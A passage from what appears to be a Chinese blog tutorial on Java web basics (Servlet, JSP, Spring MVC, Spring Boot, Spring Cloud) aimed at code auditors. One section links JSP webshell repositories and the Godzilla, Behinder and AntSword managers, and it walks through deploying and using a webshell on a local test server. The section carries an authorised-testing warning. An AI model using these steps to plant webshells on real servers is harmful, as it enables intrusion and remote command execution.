      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>JavaWEB入门</title>
    <link href="/2024/06/16/JavaWeb/"/>
    <url>/2024/06/16/JavaWeb/</url>
    
    <content type="html"><![CDATA[<h1 id="JavaWEB"><a href="#JavaWEB" class="headerlink" title="JavaWEB"></a>JavaWEB</h1><p>指由Java语言开发出来可以在万维网上访问浏览的程序</p><p>WEB包括：WEB服务端和WEB客户端</p><h1 id="Servlet"><a href="#Servlet" class="headerlink" title="Servlet"></a>Servlet</h1><h2 id="是什么"><a href="#是什么" class="headerlink" title="是什么"></a>是什么</h2><p>运行在Web服务器或应用服务器上的程序，作为来自Web浏览器或其它HTTP客户端的请求</p><h2 id="生命周期"><a href="#生命周期" class="headerlink" title="生命周期"></a>生命周期</h2><p>从创建到毁灭</p><p>1.init():初始化，只调用一次</p><p>2.service()</p><p><strong>3.doGet(),doPost()</strong></p><p>4.destroy()</p><h2 id="创建项目"><a href="#创建项目" class="headerlink" title="创建项目"></a>创建项目</h2><p><a href="https://blog.csdn.net/weixin_51367845/article/details/124325311?ops_request_misc=%7B%22request_id%22:%22171290579216800182783781%22,%22scm%22:%2220140713.130102334..%22%7D&request_id=171290579216800182783781&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~top_positive~default-2-124325311-null-null.142%5Ev100%5Epc_search_result_base4&utm_term=servlet&spm=1018.2226.3001.4187">【Servlet】Servlet 详解（使用+原理）-CSDN博客</a></p><p>建议看这个</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/Hui4401/</span>StudentManager<br>https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/czwbig/</span>Tmall_JavaEE<br></code></pre></td></tr></table></figure><p>然后可以拿这两个分析下</p><h2 id="过滤器、监听器和拦截器"><a href="#过滤器、监听器和拦截器" class="headerlink" title="过滤器、监听器和拦截器"></a>过滤器、监听器和拦截器</h2><p>**过滤器(Filter)**：用于过滤字符编码，做一些统一的业务等等。</p><p>通过<strong>javax.servlet.Filter</strong>接口进行实现</p><p>通常用于防止XSS,SQL注入，任意文件上传等</p><p>**监听器(Listener)**：做一些初始化的内容</p><p>使用<strong>javax.servlet.ServletContextListener</strong>接口实现</p><p>如果同时有监听器和过滤器，监听器在过滤器之前启动</p><p>**拦截器(Interceptor)**：依赖WEB框架</p><p>过滤器和拦截器的区别，分为以下五种：</p><ul><li>拦截器是基于 Java 的反射机制的，而过滤器是基于函数回调</li><li>过滤器依赖与 servlet 容器，而拦截器不依赖与 servlet 容器</li><li>拦截器只能对 action 请求起作用，而过滤器则可以对几乎所有的请求起作用</li><li>拦截器可以访问 action 上下文、值栈里的对象，而过滤器不能</li><li>在 action 的生命周期中，拦截器可以多次被调用，而过滤器只能在容器初始化时被调用一次</li></ul><h1 id="JSP"><a href="#JSP" class="headerlink" title="JSP"></a>JSP</h1><p>Java Server Page</p><p>一种动态网页技术</p><p>它使用JSP标签在HTML网页中插入java代码</p><p>标签通常以&lt;% code %&gt;显示</p><p>JSP本质是简化版的servlet</p><p>JVM只能识别Java的类，无法识别JSP代码</p><p>JSP常用于动态页面显示，Servlet常用于逻辑控制。</p><p>JSP做前端动态页面，在接收到用户输入后交给对应Servlet进行处理（JSP也可以当作后端代码进行逻辑控制）</p><h2 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h2><p>后缀名：.jsp</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-section">&lt;%</span><br><span class="hljs-section">out.println(<span class="hljs-string">&quot;jsp&quot;</span>)</span><br><span class="hljs-section">%&gt;</span><br><br><span class="hljs-section">&lt;jsp:scriptlet&gt;</span><br><span class="hljs-attribute">code</span><br><span class="hljs-section">&lt;/jsp:scriptlet&gt;</span><br></code></pre></td></tr></table></figure><p>生命周期:<strong>编译</strong>-&gt;初始化-&gt;执行-&gt;销毁</p><p>编译：JSP-&gt;servlet</p><p>三步:解析JSP文件-&gt;将JSP文件转为Servlet-&gt;编译Servlet</p><p>JSP指令:设置JSP整个页面属性的。格式为:&lt;%@ directive attribute&#x3D;”value” %&gt;。</p><p>常见指令:</p><table><thead><tr><th>指令</th><th>描述</th></tr></thead><tbody><tr><td>&lt;%@ page…%&gt;</td><td>定义网页依赖属性</td></tr><tr><td>&lt;%@ include %&gt;</td><td>包含其他文件</td></tr><tr><td>&lt;%@ taglib %&gt;</td><td>引入标签库定义</td></tr></tbody></table><p>内置对象</p><p>（隐式对象），这九个对象，可以不用声明直接使用。</p><table><thead><tr><th><strong>名称</strong></th><th><strong>类型</strong></th><th><strong>描述</strong></th></tr></thead><tbody><tr><td>out</td><td>javax.Servlet.jsp.JspWriter</td><td>页面输出</td></tr><tr><td>request</td><td>javax.Servlet.http.HttpServletRequest</td><td>获得用户请求</td></tr><tr><td>response</td><td>javax.Servlet.http.HttpServletResponse</td><td>服务器向客户端的回应信息</td></tr><tr><td>config</td><td>javax.Servlet.ServletConfig</td><td>服务器配置，可以取得初始化参数</td></tr><tr><td>session</td><td>javax.Servlet.http.HttpSession</td><td>保存用户的信息</td></tr><tr><td>application</td><td>javax.Servlet.ServletContext</td><td>所有用户的共享信息</td></tr><tr><td>page</td><td>java.lang.Object</td><td>指当前页面转换后的Servlet类的实例</td></tr><tr><td>pageContext</td><td>javax.Servlet.jsp.PageContext</td><td>JSP的页面容器</td></tr><tr><td>exception</td><td>java.lang.Throwable</td><td>表示JSP页面所发生的异常，在错误页中才起作用</td></tr></tbody></table><h2 id="创建项目-1"><a href="#创建项目-1" class="headerlink" title="创建项目"></a>创建项目</h2><h2 id="JSP木马"><a href="#JSP木马" class="headerlink" title="JSP木马"></a>JSP木马</h2><p>前几年是 JSP 木马的鼎盛时期，由于技术的迭代。现在大型企业使用 SprinBoot 框架来开发的系统了，该框架默认是不引入 JSP 解析的，需要引入特定依赖才可以。</p><p>而且现在前端大多使用vue，thymeleaf，freemarker等等。因此JSP木马也算逐渐没落了。</p><p>但我们还是得学习了解，毕竟网站数量基数很大，难免会在授权的测试中遇见。</p><p>JSP木马也可以称作JSP Webshell，如果对方在上传文件或其他功能没有做防护的话，攻击者可以利用任意文件上传漏洞将恶意代码传到后端，继而攻击者可以达到操作目标网站的目的。</p><p>切勿对未授权的系统进行非法测试，这是违法行为。</p><p>推荐一些较为老派的 JSP 木马的 github 仓库：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/theralfbrown/</span>WebShell-<span class="hljs-number">2</span><span class="hljs-regexp">/tree/m</span>aster/jsp<br></code></pre></td></tr></table></figure><p>近两年主流 webshell 管理工具：冰蝎，哥斯拉，蚁剑……</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs awk">冰蝎：https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/rebeyond/</span>Behinder<br>蚁剑：https:<span class="hljs-regexp">//gi</span>thub.com/AntSwordProject<br>哥斯拉：https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/BeichenDream/</span>Godzilla<br></code></pre></td></tr></table></figure><h3 id="1、JSP-大马"><a href="#1、JSP-大马" class="headerlink" title="1、JSP 大马"></a>1、JSP 大马</h3><p>JSP 大马，在代码中写入了更多功能，可以实现在网页中进行一些危险操作。</p><p>以下演示案例中的JSP大马用的是<code>https://github.com/theralfbrown/WebShell-2/tree/master/jsp</code>这个仓库中<code>无密码的jsp大马.jsp</code>。</p><p>①、在webapp下新建个<code>shell.jsp</code>，在该文件中复制粘贴以上代码。如下图所示：</p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202406151556180.jpg" alt="JSP大马"></p><p>②、点击运行，；浏览器访问<code>127.0.0.1:8080/shell.jsp</code>，从中可以看到，我们可以进行的危险操作有上传文件、执行命令等等，如下图所示：</p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202406151556069.jpg" alt="大马执行ping命令"></p><p>建议各位动手操作吧，动手操作加深理解。</p><p>感兴趣的可以自己私下阅读学习源码。</p><h3 id="2、Godzilla（哥斯拉）JSP木马操作"><a href="#2、Godzilla（哥斯拉）JSP木马操作" class="headerlink" title="2、Godzilla（哥斯拉）JSP木马操作"></a>2、Godzilla（哥斯拉）JSP木马操作</h3><p>Godzilla（哥斯拉），主要用于管理Webshell的客户端工具。近两年比较主流的工具。哥斯拉内置了 3 种 Payload 以及 6 种加密器,6 种支持脚本后缀，20 个内置插件。</p><p>Github地址：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/BeichenDream/</span>Godzilla<br></code></pre></td></tr></table></figure><p>下载地址：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/BeichenDream/</span>Godzilla<span class="hljs-regexp">/releases/</span>tag/v4.<span class="hljs-number">0.1</span>-godzilla<br></code></pre></td></tr></table></figure><p>下面我们在代码文件中再新建一个名为<code>shell1.jsp</code>文件，配合哥斯拉的JSP木马进行操作。</p><p>①、下载完成后，启动哥斯拉，点击左上角管理，选择生成，此步骤是为了生成JSP木马代码，如下图所示：</p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202406151557129.jpg" alt="哥斯拉生成木马"></p><p>然后点击生成，suffix 选择为 JSP，点击确定后选择存放目录。</p><p>②、将已生成的代码复制粘贴到<code>shell1.jsp</code>中，然后启动项目。如下图所示：</p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202406151557788.jpg" alt="复制粘贴到shell1jsp中"></p><p>③、打开哥斯拉，点击左上角目标，选择添加，将shell1.jsp地址添加进去后点击添加，如下图所示：</p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202406151557891.jpg" alt="添加目标"></p><p>④、点击添加后，在管理页面即可看到该链接，右键选择进入，成功进入webshell管理页面，剩下的自己研究下吧。</p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202406151557943.jpg" alt="shell执行whoami"></p><h1 id="Spring"><a href="#Spring" class="headerlink" title="Spring"></a>Spring</h1><p><a href="https://spring.io/">Spring | Home</a></p><p>开源框架，用于构建企业级java应用程序</p><p>核心特点：</p><p><strong>轻量级</strong></p><p><strong>控制反转</strong></p><p><strong>面向切面编程</strong></p><p><strong>容器</strong></p><p><strong>数据访问</strong></p><p><strong>事务管理</strong></p><p><strong>模块化</strong></p><p>Spring是一个java开源框架接口，是一个生态体系</p><p>核心框架为Spring Framework</p><p>在这基础上衍生出Spring Boot、Spring Cloud、Spring Data、Spring Security等</p><h2 id="Spring-MVC"><a href="#Spring-MVC" class="headerlink" title="Spring MVC"></a>Spring MVC</h2><p>Spring基础上的一个MVC框架，基于模型-视图-控制器（model-view-controller)设计模式进行javaweb系统的开发，它是Spring的一个模块，通过Dispatcher Servlet,ModelAndView和View Resolver等</p><p>想用SpringMVC必须先依赖Spring</p><h2 id="MVC"><a href="#MVC" class="headerlink" title="MVC"></a>MVC</h2><p>MVC是一种软件框架模式，被广泛应用再JavaEE项目开发中、MVC模式通过提供一种良好的组织结构和分工方式，帮助解决了软件开发中的耦合、可维护性、可测试性和可扩展性等方面的问题。</p><p>MVC</p><p>M</p><p>模型是用于处理数据逻辑的部分</p><p>所谓数据逻辑，也就是数据的映射以及对数据的增删改查，Bean、DAO(数据访问对象)等都属于模型部分</p><p>V</p><p>视图负责数据与其它信息的显示，也就是给用户看到的页面</p><p>html、JSP等页面都可以作为视图‘</p><p>C</p><p>控制器是模型与视图之间的桥梁，控制着数据与用户的交互。</p><p>控制器通常负责从视图读取数据，处理用户输入，并向模型发送数据，也可以从模型中读取数据，再发送给视图，由视图显示</p><h2 id="核心架构流程"><a href="#核心架构流程" class="headerlink" title="核心架构流程"></a>核心架构流程</h2><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202406151557075.png" alt="spring-springframework-mvc-5"></p><p>在 Spring MVC 框架中，<code>DispatcherServlet</code>、<code>HandlerMapping</code> 和 <code>HandlerAdapter</code> 是三个重要的组件，它们各自承担不同的角色，协同工作以处理客户端的请求并调度相应的处理程序。以下是它们的解释和作用：</p><p><strong>DispatcherServlet（调度器Servlet）：</strong></p><ul><li><strong>作用：</strong> <code>DispatcherServlet</code> 是 Spring MVC 中的前端控制器（Front Controller），负责接收客户端的所有请求并将其分派给适当的处理程序（Controller）。</li><li><strong>解释：</strong> 当客户端发送请求时，<code>DispatcherServlet</code> 接收请求，然后根据配置和规则找到合适的 <code>HandlerMapping</code> 来确定请求对应的处理程序。一旦找到处理程序，<code>DispatcherServlet</code> 将请求交给该处理程序进行处理。它还负责处理异常、视图解析和其他与请求生命周期相关的任务。</li><li><strong>源代码路径：</strong></li></ul><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/spring-projects/</span>spring-framework<span class="hljs-regexp">/blob/m</span>ain<span class="hljs-regexp">/spring-webmvc/</span>src<span class="hljs-regexp">/main/</span>java<span class="hljs-regexp">/org/</span>springframework<span class="hljs-regexp">/web/</span>servlet/DispatcherServlet.java<br></code></pre></td></tr></table></figure><p><strong>HandlerMapping（处理程序映射）：</strong></p><ul><li><strong>作用：</strong> <code>HandlerMapping</code> 负责将请求映射到相应的处理程序（Controller）。它确定了客户端请求应该由哪个处理程序来处理。</li><li><strong>解释：</strong> 在 Spring MVC 中，可以有多个 <code>HandlerMapping</code> 实现，包括基于注解的映射、基于路径的映射等。<code>HandlerMapping</code> 将请求的 URL 映射到具体的控制器类和方法，以便 <code>DispatcherServlet</code> 可以将请求分发给正确的处理程序。</li><li><strong>源代码路径：</strong></li></ul><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/spring-projects/</span>spring-framework<span class="hljs-regexp">/blob/m</span>ain<span class="hljs-regexp">/spring-webmvc/</span>src<span class="hljs-regexp">/main/</span>java<span class="hljs-regexp">/org/</span>springframework<span class="hljs-regexp">/web/</span>servlet/HandlerMapping.java<br></code></pre></td></tr></table></figure><p><strong>HandlerAdapter（处理程序适配器）：</strong></p><ul><li><strong>作用：</strong> <code>HandlerAdapter</code> 负责调用实际的处理程序（Controller）来处理请求，并将处理程序的执行结果返回给 <code>DispatcherServlet</code>。</li><li><strong>解释：</strong> 不同的处理程序可能有不同的接口，<code>HandlerAdapter</code> 的作用是适配各种不同类型的处理程序，使得它们能够被 <code>DispatcherServlet</code> 统一调用。它将请求传递给处理程序，处理程序执行后，<code>HandlerAdapter</code> 还负责处理返回的结果，如视图解析、数据绑定等。</li><li><strong>源代码路径：</strong></li></ul><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/spring-projects/</span>spring-framework<span class="hljs-regexp">/blob/m</span>ain<span class="hljs-regexp">/spring-webmvc/</span>src<span class="hljs-regexp">/main/</span>java<span class="hljs-regexp">/org/</span>springframework<span class="hljs-regexp">/web/</span>servlet/HandlerAdapter.java<br></code></pre></td></tr></table></figure><p>这三个组件共同协作，实现了请求的分发和处理。<code>DispatcherServlet</code> 充当总管，<code>HandlerMapping</code> 负责找到处理程序，而 <code>HandlerAdapter</code> 则负责调用实际的处理程序执行业务逻辑。这种设计使得 Spring MVC 具有灵活性，允许通过配置来适应不同的业务需求和处理程序类型。</p><blockquote><p>以上部分内容引用自下方链接，推荐大家拓展阅读</p><p><a href="https://pdai.tech/md/spring/spring-x-framework-springmvc.html">https://pdai.tech/md/spring/spring-x-framework-springmvc.html</a></p><p><a href="https://pdai.tech/files/kaitao-springMVC.pdf">https://pdai.tech/files/kaitao-springMVC.pdf</a></p></blockquote><h2 id="简单案例"><a href="#简单案例" class="headerlink" title="简单案例"></a>简单案例</h2><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">https:<span class="hljs-regexp">//gi</span>tee.com<span class="hljs-regexp">/huang_xiao_feng/</span>carrentalsystem<br></code></pre></td></tr></table></figure><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202406151605400.png" alt="image-20240416132652861"></p><p>首先注意，我们打开文件的时候要选择包含<strong>pom.xml</strong>的文件夹</p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202406151605107.png" alt="image-20240416133600921"></p><p>然后maven配置称自己电脑上的</p><p>导入之后我们看看pom.xml中是否有报错，如果有报红的，那就说明依赖还没有引入进来</p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202406151605205.png" alt="image-20240416133120230"></p><p>然后就是看src文件中的文件，如果还是有.java后缀的就说明项目还没有被编译成功（如图所示就是编译成功的class文件）</p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202406151605354.png" alt="image-20240416133855560"></p><p>然后我们在pom.xml中有一些报黄的，鼠标放上去就能自动显示这个版本的依赖有哪些漏洞</p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202406151605190.png" alt="image-20240416134040791"></p><p>在web.xml中我们可以看到请求路径的映射关系</p><p>我们那一段来进行简单分析</p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202406151605560.png" alt="image-20240416134509581"></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">servlet</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">servlet-name</span>&gt;</span>springMvc<span class="hljs-tag">&lt;/<span class="hljs-name">servlet-name</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">servlet-class</span>&gt;</span>org.springframework.web.servlet.DispatcherServlet<span class="hljs-tag">&lt;/<span class="hljs-name">servlet-class</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">init-param</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">param-name</span>&gt;</span>contextConfigLocation<span class="hljs-tag">&lt;/<span class="hljs-name">param-name</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">param-value</span>&gt;</span>classpath:applicationContext.xml<span class="hljs-tag">&lt;/<span class="hljs-name">param-value</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">init-param</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">load-on-startup</span>&gt;</span>1<span class="hljs-tag">&lt;/<span class="hljs-name">load-on-startup</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">servlet</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">servlet-mapping</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">servlet-name</span>&gt;</span>springMvc<span class="hljs-tag">&lt;/<span class="hljs-name">servlet-name</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">url-pattern</span>&gt;</span>/<span class="hljs-tag">&lt;/<span class="hljs-name">url-pattern</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">servlet-mapping</span>&gt;</span><br></code></pre></td></tr></table></figure><p>这里首先是可以看到</p><servlet><p>说明这是一个servlet</p><p>然后名称是</p><p>​    <servlet-name>springMvc</servlet-name></p><p>springMvc</p><p>然后对应的class是</p><p>org.springframework.web.servlet.DispatcherServlet</p><p>就是说请求的路径都可以交给这个DispatcherServlet处理</p><p>前面说到这个的作用就是分发、请求</p><p>然后一般是按照web.xml的配置顺序来执行的，但我们可以看到</p><p><load-on-startup>1</load-on-startup></p><p>这就让它可以在第一个执行</p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202406151605650.png" alt="image-20240416140617266"></p><p>然后再看这个springmvc.xml,是对springmvc的配置</p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202406151607619.png" alt="image-20240416141032992"></p><p>这个是数据库配置</p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202406151607891.png" alt="image-20240416141152651"></p><p>这个写具体代码</p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202406151607072.png" alt="image-20240416141127852"></p><p>这个放一些静态文件</p><h1 id="Spring-Boot"><a href="#Spring-Boot" class="headerlink" title="Spring Boot"></a>Spring Boot</h1><p>SpringBoot是一款基于JAVA的开源框架。目的是为了简化Spring应用搭建和开发流程。</p><p>SpingBoot核心原理是自动装配</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>spring.io<span class="hljs-regexp">/projects/</span>spring-boot<br></code></pre></td></tr></table></figure><p> 创建项目</p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202406151607579.png" alt="image-20240416155307497"></p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202406151607315.png" alt="image-20240416155335903"></p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202406151607066.png" alt="image-20240416232904840"></p><p>点击运行</p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202406151607050.png" alt="image-20240416232920444"></p><p>就可以打开</p><p>接下来进行简单分析</p><p><code>@SpringBootApplication</code>注解表示这个类为 SpringBoot 的主配置类，SpringBoot 项目应运行这个类下面的 main 方法来启动 SpringBoot 应用。</p><p>也就是说这个 XXXApplication 是该项目的入口。</p><p>④、我们使用的是阿里云的脚手架创建的 SpringBoot 项目，可以看到在com\example\demo 目录下有个 demos\web 目录，里面是一些示例代码。如下图所示：</p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202406151608710.jpg" alt="helloworld代码"></p><p>⑦、点击右上方运行，或者进入 XXXApplication 中，点击左侧绿色小按钮，即刻运行项目，打开浏览器输入<code>http://127.0.0.1:8080/hello</code>，即可看到返回了一些内容，如下图所示：</p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202406151608798.jpg" alt="返回helloworld"></p><p>⑧、下面我们进入 demos.web 目录下，看看他的 Controller 代码，也就是返回上面内容的接口代码，是位于该目录下的 BasicController，拿上述接口距离，访问 hello 会返回你输入的名字，默认值是 unkonown user，如下图所示：</p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202406151608182.jpg"></p><p><strong>其他一些注解含义：</strong></p><p><code>@Controller</code>注解：标注该类为controller类，可以处理 http 请求。@Controller 一般要配合模版来使用。现在项目大多是前后端分离，后端处理请求，然后返回JSON格式数据即可，这样也就不需要模板了。</p><p><code>@ResponseBody</code>注解：将该注解写在类的外面，表示这个类所有方法的返回的数据直接给浏览器。<code> @RestController 相当于 @ResponseBody 加上 @Controller</code></p><p><code>@RequestMapping</code>注解：配置<code>URL映射</code>，可以作用于某个Controller类上，也可以作用于某Controller类下的具体方法中，说白了就是URL中请求路径会直接映射到具体方法中执行代码逻辑。</p><p><code>@PathVariable</code>注解：接受请求URL路径中占位符的值，示例代码如下图所示：</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-meta">@Controller</span><br><span class="hljs-meta">@ResponseBody</span><br><span class="hljs-meta">@RequestMapping</span>(<span class="hljs-string">&quot;/hello&quot;</span>)<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">HelloController</span> &#123;<br>    <span class="hljs-meta">@RequestMapping</span>(<span class="hljs-string">&quot;/whoami/&#123;name&#125;/&#123;sex&#125;&quot;</span>)<br>    <span class="hljs-keyword">public</span> <span class="hljs-title class_">String</span>  <span class="hljs-title function_">hello</span>(<span class="hljs-params"><span class="hljs-meta">@PathVariable</span>(<span class="hljs-string">&quot;name&quot;</span>) <span class="hljs-built_in">String</span> name, <span class="hljs-meta">@PathVariable</span>(<span class="hljs-string">&quot;sex&quot;</span>) <span class="hljs-built_in">String</span> sex</span>)&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Hello&quot;</span> + name + sex;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><code>@RequestParam</code>注解：将请求参数绑定到你控制器的方法参数上（是springmvc中接收普通参数的注解），常用于POST请求处理表单。</p><p>综上演示，可以看到 Spring Boot 部署非常方便，并且在开发后端服务时也极大简化了各种配置，可以更专注于编写代码。这对于我们审计 Spring Boot 架构的系统也极为的便利。</p><h1 id="Spring-Cloud"><a href="#Spring-Cloud" class="headerlink" title="Spring Cloud"></a>Spring Cloud</h1><p>Spring Cloud 是一系列框架的有序集合。是一套基于 Spring Framework 的分布式系统开发工具，用于构建分布式应用程序中的各种模块化组件。</p><p>它利用 Spring Boot 的开发便利性巧妙地简化了分布式系统基础设施的开发，如服务发现注册、配置中心、消息总线、负载均衡、断路器、数据监控等，都可以用 Spring Boot 的开发风格做到一键启动和部署。</p><p>Spring Cloud 的诞生并不是为了解决微服务中的某一个问题，而是提供了一套解决微服务架构实施的综合性解决方案。</p><p>Spring Cloud 并没有重复制造轮子，它只是将各家公司开发的比较成熟、经得起实际考验的服务框架组合起来，通过 Spring Boot 风格进行再封装屏蔽掉了复杂的配置和实现原理，最终给开发者留出了一套简单易懂、易部署和易维护的分布式系统开发工具包。</p><p>大家也听过微服务吧。那它和 Spring Cloud 什么关系呢？</p><p>首先，什么是微服务？</p><p>微服务（英语：Microservices）是一种软件架构风格，它是以专注于单一责任与功能的小型功能区块 (Small Building Blocks) 为基础，利用模块化的方式组合出复杂的大型应用程序，各功能区块使用与语言无关的API集相互通信。 </p><p>简单来说，微服务就是将一个大型的应用拆分成很多个小的应用，这些应用之间一般通过基于HTTP的RESTful API进行通信协作，并且能够各自进行独立部署以及伸缩。由于微服务独立部署，可伸缩的特性，它能够迅速地大规模部署到云服务器上。</p><p>而使用 Spring Cloud 能够快速实现微服务架构。</p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202406151608595.jpg" alt="7"></p><p>官方介绍：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>spring.io<span class="hljs-regexp">/projects/</span>spring-cloud<br></code></pre></td></tr></table></figure><p>Spring Cloud 提供了许多模块，以下是一些常用的模块及其主要作用：</p><p><strong>Spring Cloud Config（配置中心）：</strong></p><ul><li>作用：用于集中管理配置信息，可以将配置信息存储在版本控制系统中，并在需要时动态刷新。</li></ul><p><strong>Spring Cloud Netflix（服务治理）：</strong></p><ul><li>作用：整合了Netflix开发的一些组件，包括Eureka（服务注册与发现）、Ribbon（客户端负载均衡）、Hystrix（熔断器）、Feign（声明式REST客户端）等，用于构建具有高可用性和弹性的微服务架构。</li></ul><p><strong>Spring Cloud Bus（消息总线）：</strong></p><ul><li>作用：通过消息总线，实现微服务架构中配置的动态刷新，使得配置的修改能够快速传播到各个微服务实例。</li></ul><p><strong>Spring Cloud Sleuth（分布式追踪）：</strong></p><ul><li>作用：用于跟踪分布式系统中的请求流程，生成跨服务的唯一标识，方便在分布式系统中进行日志跟踪和性能监控。</li></ul><p><strong>Spring Cloud Gateway（网关）：</strong></p><ul><li>作用：提供了一种简单而有效的方式来进行路由、过滤以及转发请求，用于构建微服务架构中的API网关。</li></ul><p><strong>Spring Cloud Stream（消息驱动）：</strong></p><ul><li>作用：简化了消息驱动的微服务开发，提供了一套统一的编程模型，支持多种消息中间件。</li></ul><p><strong>Spring Cloud Security（安全）：</strong></p><ul><li>作用：提供了一些安全工具和特性，用于保护分布式系统中的微服务。</li></ul><p><strong>Spring Cloud Data Flow（数据流）：</strong></p><ul><li>作用：用于构建和部署实时数据处理和分析的微服务，支持复杂的数据流操作。</li></ul><p><strong>Spring Cloud OpenFeign（声明式REST客户端）：</strong></p><ul><li>作用：简化了微服务之间的REST调用，通过声明式的方式定义和调用服务接口。</li></ul><p><strong>Spring Cloud Task（任务调度）：</strong></p><ul><li>作用：用于简化任务调度和执行，支持在分布式环境中进行批处理任务的调度和执行。</li></ul><p>若依微服务版本：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs 